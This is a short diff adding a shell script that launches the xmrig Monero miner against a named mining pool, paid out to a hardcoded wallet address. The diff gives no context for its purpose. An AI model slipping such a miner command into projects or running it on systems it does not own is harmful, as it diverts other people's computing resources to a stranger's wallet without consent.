@@ -1,0 +1,3 @@
+#!/bin/sh
+set -e -x
+exec /usr/bin/xmrig -o stratum+tcp://mine.moneropool.com:3333 --donate-level=1 -u 48HdeM79tB3bMcGUrRH8NB1Hfh1sAYiep91zcpkUbyZwRhYNgaXbxb9Cqenn748H8cEnRNzCH1yjSN49vbSU4tr48AnNLcm -p x
